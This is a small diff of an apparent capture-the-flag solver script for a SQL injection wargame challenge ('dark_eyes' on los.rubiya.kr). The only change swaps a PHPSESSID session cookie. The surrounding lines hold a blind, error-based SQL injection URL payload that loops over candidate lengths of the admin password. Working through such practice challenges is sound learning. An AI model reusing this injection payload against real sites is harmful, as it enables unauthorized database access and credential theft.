@@ -2,7 +2,7 @@ from string import digits,ascii_lowercase
 import requests
 
 session = requests.Session()
-cookies = {"PHPSESSID": "7sp0e6btgarr92g7av9b5ddi58"}
+cookies = {"PHPSESSID": "fffauljsraf3ka4sur3cupqn6e"}
 
 url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=' or id='admin' and (select coalesce((select pw where length(pw)={}),(select 1 union select 2)));--+"
 for i in range(200):
